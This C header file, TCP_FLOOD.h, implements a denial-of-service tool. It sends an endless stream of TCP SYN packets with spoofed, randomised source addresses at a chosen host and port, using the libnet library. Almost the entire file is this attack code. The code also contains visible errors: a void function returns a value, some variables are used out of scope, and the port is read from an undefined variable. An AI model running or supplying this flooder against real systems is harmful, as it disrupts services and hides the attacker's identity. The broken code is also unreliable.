/*
* TCP_FLOOD.h
* 
* Provides TCP SYN flooding function
*/ 

void tcp_stop_flood(int signum) {
	printf("TCP/SYN Flood stopped\n");
	libnet_destroy_packet(&packet); //Free packet memory 

    if (libnet_close_raw_sock(network) == -1) //Close the network interface 
		libnet_error(LIBNET_ERR_WARNING, "can't close network interface.");
	return signum;
}

int tcp_flood(char *target_host[1024], int target_port) {
	/*
	* This function launches a TCP SYN flood on TARGET_IP
	* and TARGET_PORT
	 */
	 
	 //Define signal for SIGINT
	 signal(SIGINT, tcp_stop_flood);
	 
	 u_long dest_ip;
	 u_short dest_port;
	 u_char errbuf[LIBNET_ERRBUF_SIZE], *packet;
	 int opt, network, byte_count, packet_size = LIBNET_IP_H + LIBNET_TCP_H;
	 
	 dest_ip = libnet_name_resolve(target_host, LIBNET_RESOLVE); //The host
	 dest_port = (u_short) atoi(target_ip); //The port
	 
	 network = libnet_open_raw_sock(IPPROTO_RAW); //Open network interface 
	 if (network == -1)
		libnet_error(LIBNET_ERR_FATAL, "CANNOT OPEN NETWORK INTERFACE: MUST BE RUN AS ROOT");

     libnet_init_packet(packet_size, &packet); //Allocate memory for packet 
	 if (packet == NULL)
		libnet_error(LIBNET_ERR_FATAL, "CANT INITIALIZE PACKET MEMORY\n");

     libnet_seed_prand(); //Seed the random number generator 
	 
	 while(1) {
		//Build and send TCP/SYN packet
		libnet_build_ip(LIBNET_TCP_H,       //Size of the packet sans IP header 
			IPTOS_LOWDELAY,                 //IP tos 
			libnet_get_prand(LIBNET_PRu16), //IP ID (randomized) 
			0,                              //Frag stuff 
			libnet_get_prand(LIBNET_PR8),   //TTL (randomized) 
			IPPROTO_TCP,                    //Transport protocol 
			libnet_get_prand(LIBNET_PRu32), //Source IP (randomized) 
			dest_ip,                        //Destination IP 
			NULL,                           //Payload (none) 
			0,                              //Payload length 
			packet);                        //Packet header memory 

		libnet_build_tcp(libnet_get_prand(LIBNET_PRu16), // source TCP port (random) 
			dest_port,                      //Destination TCP port 
			libnet_get_prand(LIBNET_PRu32), //Sequence number (randomized) 
			libnet_get_prand(LIBNET_PRu32), //Acknowledgement number (randomized) 
			TH_SYN,                         //Control flags (SYN flag set only) 
			libnet_get_prand(LIBNET_PRu16), //Window size (randomized) 
			0,                              //Urgent pointer 
			NULL,                           //Payload (none) 
			0,                              //Payload length 
			packet + LIBNET_IP_H);          //Packet header memory 

		if (libnet_do_checksum(packet, IPPROTO_TCP, LIBNET_TCP_H) == -1)
			libnet_error(LIBNET_ERR_FATAL, "CANNOT COMPUTE CHECKSUM\n");

		byte_count = libnet_write_ip(network, packet, packet_size); //Send packet
		if (byte_count < packet_size)
			libnet_error(LIBNET_ERR_WARNING, "WARNING: INCOMPLETE PACKET WRITTEN (%d of %d bytes)\n", byte_count, packet_size);

		usleep(10);  
	 }
}
